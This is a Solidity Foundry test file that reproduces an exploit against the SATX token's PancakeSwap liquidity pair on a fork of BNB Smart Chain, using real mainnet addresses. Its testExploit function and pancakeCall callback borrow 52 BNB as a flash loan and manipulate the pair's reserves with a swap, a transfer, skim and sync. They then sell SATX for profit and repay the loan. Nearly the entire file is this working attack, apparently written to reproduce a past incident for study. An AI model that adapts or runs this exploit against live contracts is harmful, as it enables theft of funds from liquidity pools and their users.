// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant CakeBnbPair = IPancakePairV2(
    0x0eD7e52944161450477ee417DE9Cd3a859b14fD0
);
IPancakePairV2 constant BnbSatxPair = IPancakePairV2(
    0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4
);

contract SatxTest is Test {
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() public {
        vm.createSelectFork("bsc", 37_914_434 - 1);

        deal(address(BNB), address(this), 0.9 ether);
    }

    function showPrice() public {
        console.log("-------------------");
        (uint112 reserve0, uint112 reserve1, ) = BnbSatxPair.getReserves();
        uint256 price = (reserve1 * 1e6) / reserve0;
        emit log_named_decimal_uint("r0", reserve0, 18);
        emit log_named_decimal_uint("r1", reserve1, 18);
        emit log_named_decimal_uint("Price", price, 6);
        console.log("-------------------");
    }

    function testExploit() public {
        SATX.approve(address(pancakeRouterV2), type(uint256).max);
        BNB.approve(address(pancakeRouterV2), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(BNB);
        path[1] = address(SATX);
        // 0.001 bnb -> 13.397690168956297175 SATS
        pancakeRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.001 ether,
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        pancakeRouterV2.addLiquidity(
            address(BNB),
            address(SATX),
            0.001 ether,
            SATX.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1
        );

        CakeBnbPair.swap(
            0, // amount0Out
            52 ether, // amount1Out
            address(this), // to
            hex"31"
        );

        emit log_named_decimal_uint(
            "WBNB balance",
            BNB.balanceOf(address(this)),
            18
        );
    }

    function pancakeCall(
        address sender,
        uint256 /* amount0 */,
        uint256 amount1,
        bytes calldata /* data */
    ) public {
        require(sender == address(this), "FLASHCALL ERROR");

        if (msg.sender == address(CakeBnbPair)) {
            uint256 halfPairSatx = SATX.balanceOf(address(BnbSatxPair)) / 2;

            BnbSatxPair.swap(
                0.0001 ether,
                halfPairSatx,
                address(this),
                hex"31"
            );

            showPrice();

            SATX.transfer(address(BnbSatxPair), halfPairSatx);
            BnbSatxPair.skim(address(this));
            BnbSatxPair.sync();
            BNB.transfer(address(BnbSatxPair), 0.0001 ether);

            showPrice();

            address[] memory path = new address[](2);
            path[0] = address(SATX);
            path[1] = address(BNB);
            pancakeRouterV2
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    SATX.balanceOf(address(this)),
                    0,
                    path,
                    address(this),
                    block.timestamp + 1
                );

            // fee / (amount + fee)
            uint256 fee = (amount1 * swapFeeBase) /
                (swapFeeTotal - swapFeeBase);
            BNB.transfer(address(CakeBnbPair), amount1 + fee + 1);
        }

        if (msg.sender == address(BnbSatxPair)) {
            BNB.transfer(address(BnbSatxPair), 52 ether);
        }
    }
}
